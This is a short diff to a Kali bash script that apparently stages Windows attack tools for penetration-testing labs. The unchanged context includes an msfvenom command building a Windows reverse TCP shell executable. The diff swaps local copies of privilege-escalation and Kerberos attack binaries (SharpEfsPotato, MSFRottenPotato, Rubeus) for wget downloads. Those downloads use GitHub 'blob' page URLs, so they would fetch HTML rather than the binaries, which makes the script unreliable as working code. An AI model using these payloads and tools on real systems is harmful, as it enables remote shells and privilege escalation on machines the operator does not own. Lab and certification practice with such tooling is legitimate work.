@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/bash -e
 
 # Windows Tools ready to serve in seconds on Kali
 
@@ -67,10 +67,9 @@ wget https://raw.githubusercontent.com/adann0/py_upload/main/upload.ps1
 
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
 
-SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
-cp $SCRIPT_DIR/bin/SharpEfsPotato.exe .
-cp $SCRIPT_DIR/bin/MSFRottenPotato.exe .
-cp $SCRIPT_DIR/bin/Rubeus.exe .
+wget https://github.com/adann0/oscp-tools/blob/main/bin/MSFRottenPotato.exe
+wget https://github.com/adann0/oscp-tools/blob/main/bin/SharpEfsPotato.exe
+wget https://github.com/adann0/oscp-tools/blob/main/bin/Rubeus.exe
 
 rm -f *.zip *.gz
 
